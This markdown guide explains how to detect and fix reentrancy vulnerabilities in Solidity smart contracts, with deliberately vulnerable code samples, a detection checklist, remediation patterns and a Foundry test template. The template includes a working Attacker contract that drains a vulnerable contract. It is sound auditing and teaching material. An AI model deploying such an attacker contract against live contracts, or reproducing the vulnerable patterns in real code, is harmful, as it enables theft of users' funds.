# Reentrancy Detection Methodology

## Overview

Reentrancy is one of the most critical vulnerabilities in smart contracts, allowing attackers to repeatedly call a function before its first invocation completes, potentially draining funds or corrupting state.

## Types of Reentrancy

### 1. Classic Reentrancy (Single-Function)
```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    (bool success,) = msg.sender.call{value: amount}(""); // External call
    require(success);
    balances[msg.sender] = 0; // State update AFTER external call
}
```

**Detection Pattern:**
- External call before state update
- CEI (Checks-Effects-Interactions) pattern violation
- No reentrancy guard

### 2. Cross-Function Reentrancy
```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] = 0;
}

function transfer(address to, uint256 amount) external {
    require(balances[msg.sender] >= amount); // Uses stale balance
    balances[msg.sender] -= amount;
    balances[to] += amount;
}
```

**Detection Pattern:**
- Multiple functions share same state
- Reentrancy via different entry point
- State inconsistency during execution

### 3. Read-Only Reentrancy
```solidity
function getPrice() public view returns (uint256) {
    uint256 balance = vault.balanceOf(address(this));
    uint256 supply = totalSupply();
    return balance * 1e18 / supply; // Can be manipulated during reentrancy
}
```

**Detection Pattern:**
- View/pure function reads state during external call
- No state changes, but return value can be manipulated
- Other contracts rely on this view function
- Commonly seen in price oracles and vault share calculations

### 4. Cross-Contract Reentrancy
```solidity
// Contract A
function action() external {
    contractB.callback(); // External call to B
    balance = 0; // State update after
}

// Contract B
function callback() external {
    contractA.exploit(); // Re-enter via different contract
}
```

**Detection Pattern:**
- Multiple contracts in call chain
- Shared state across contracts
- Complex interaction patterns

### 5. Delegatecall Reentrancy
```solidity
function execute(address target, bytes calldata data) external {
    (bool success,) = target.delegatecall(data); // Dangerous
    require(success);
    // State can be corrupted via delegatecall
}
```

**Detection Pattern:**
- Delegatecall to untrusted contracts
- Storage layout manipulation
- Context preservation allows state corruption

## Detection Algorithm

### Step 1: Identify External Calls
Look for:
- `call()`, `delegatecall()`, `staticcall()`
- `.transfer()`, `.send()`
- External contract function calls
- Interface calls

### Step 2: Trace State Changes
Before external call:
- Which state variables are read?
- Which invariants must hold?

After external call:
- Which state variables are updated?
- Are all invariants restored?

### Step 3: Check CEI Pattern
Correct order:
1. **Checks**: Validate inputs, require conditions
2. **Effects**: Update state variables
3. **Interactions**: External calls

Violation = Potential reentrancy

### Step 4: Verify Protection Mechanisms
- ReentrancyGuard modifier (OpenZeppelin)
- Mutex/lock pattern
- State machine with status flags
- Pull over push pattern

### Step 5: Analyze Call Graph
- Map all possible execution paths
- Identify loops and cycles
- Check for cross-function vulnerabilities

## Chain-of-Thought Template

```json
{
  "step": "Analyzing withdraw() for reentrancy",
  "observation": "Line 45: msg.sender.call{value: amount}() before line 48: balances[msg.sender] = 0",
  "hypothesis": "CEI pattern violated - external call before state update enables reentrancy",
  "validation": [
    "No ReentrancyGuard modifier found",
    "No mutex lock pattern",
    "Attacker can re-enter via receive()/fallback()",
    "Balance check on line 44 uses stale state during reentrant call"
  ],
  "conclusion": "CRITICAL: Classic reentrancy vulnerability - attacker can drain contract",
  "confidence": 0.98
}
```

## Test Generation

### Foundry Test Template
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract ReentrancyExploitTest is Test {
    Vulnerable public target;
    Attacker public attacker;

    function setUp() public {
        target = new Vulnerable();
        attacker = new Attacker(address(target));

        // Fund the vulnerable contract
        vm.deal(address(target), 10 ether);
    }

    function testReentrancyAttack() public {
        // Give attacker initial funds
        vm.deal(address(attacker), 1 ether);

        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Execute attack
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // Assertions
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertGt(address(attacker).balance, attackerBalanceBefore, "Attacker should profit");

        console.log("Target lost:", targetBalanceBefore);
        console.log("Attacker gained:", address(attacker).balance - attackerBalanceBefore);
    }
}

contract Attacker {
    Vulnerable public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = Vulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        // Limit reentrancy to prevent infinite loop
        if (attackCount < 10 && address(target).balance > 0) {
            attackCount++;
            target.withdraw();
        }
    }
}
```

## Remediation Patterns

### 1. ReentrancyGuard (Recommended)
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Safe is ReentrancyGuard {
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```

### 2. Checks-Effects-Interactions
```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    balances[msg.sender] = 0; // Effect BEFORE interaction

    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

### 3. Pull Over Push
```solidity
mapping(address => uint256) public pendingWithdrawals;

function initiateWithdrawal(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;
    pendingWithdrawals[msg.sender] += amount;
}

function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

## Historical Examples

- **The DAO Hack (2016)**: $60M stolen via reentrancy
- **Lendf.Me (2020)**: $25M stolen via ERC777 reentrancy
- **Cream Finance (2021)**: Read-only reentrancy via LP tokens

## References

- SWC-107: Reentrancy
- [Consensys Best Practices](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [Sigma Prime: Reentrancy](https://blog.sigmaprime.io/solidity-security.html#reentrancy)
